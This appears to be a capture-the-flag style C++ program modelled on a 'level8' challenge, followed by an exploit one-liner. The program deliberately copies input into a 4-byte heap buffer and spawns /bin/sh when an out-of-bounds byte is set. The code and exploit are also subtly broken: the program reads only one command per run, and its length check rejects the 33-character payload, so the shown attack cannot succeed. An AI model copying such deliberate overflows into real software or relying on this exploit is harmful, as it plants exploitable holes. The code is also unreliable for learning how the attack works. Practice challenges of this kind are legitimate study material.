#include <iostream>
#include <cstring>
#include <cstdlib>

char buf[128];
char* auth = nullptr;
char* service = nullptr;

int main() 
{
    // Read user input into buf
    if (!fgets(buf, sizeof(buf), stdin))
    {
        return (1);
    }

    // If the command starts with "auth "
    if (strncmp(buf, "auth ", 5) == 0)
    {
        auth = (char*)malloc(4);
        *auth = 0;

        char* input = buf + 5;
        if (strlen(input) <= 30)
        {
            strcpy(auth, input);  // buffer overflow potential here
        }
    }

    // If the command is "reset"
    if (strncmp(buf, "reset", 5) == 0)
    {
        free(auth);
        auth = nullptr;
    }

    // If the command starts with "service"
    if (strncmp(buf, "service", 7) == 0)
    {
        char temp[121];
        strncpy(temp, buf + 8, sizeof(temp) - 1);
        temp[sizeof(temp) - 1] = '\0';

        service = strdup(temp);
    }

    // If the command is "login"
    if (strncmp(buf, "login", 5) == 0)
    {
        if (auth != nullptr && auth[32] != 0)
        {  // Reading beyond malloc(4) buffer
            system("/bin/sh");  // Shell gets executed
        }
        else 
        {
            std::cout << "Password:\n";
        }
    }

    return (0);
}

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ (echo 'auth '$(python -c "print('A'*32 + 'B')"); echo login) | ./level8

